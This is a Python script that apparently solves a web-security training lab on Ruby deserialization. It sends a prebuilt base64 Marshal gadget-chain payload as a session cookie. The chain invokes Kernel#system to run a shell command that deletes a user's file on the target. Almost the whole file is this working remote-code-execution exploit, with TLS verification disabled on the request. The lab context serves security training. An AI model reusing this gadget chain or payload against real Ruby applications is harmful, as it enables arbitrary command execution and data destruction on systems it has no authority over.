import requests
from colorama import Fore
import urllib3
import base64
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting Ruby deserialization using a documented gadget chain"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Modify a documented gadget chain and generate the payload\n2. Fetch the home page with the modified object as session to delete the morale.txt file\n""")

    print("Fetching the home page with the payload as session to delete the morale.txt file")

    print("The payload was generated using a documented gadget chain after a slight modification (https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)")
    
    serialized_encoded = "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ=="

    cookies = { "session": serialized_encoded }

    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies, allow_redirects=False,
                 verify=False, proxies=proxies)
    return True
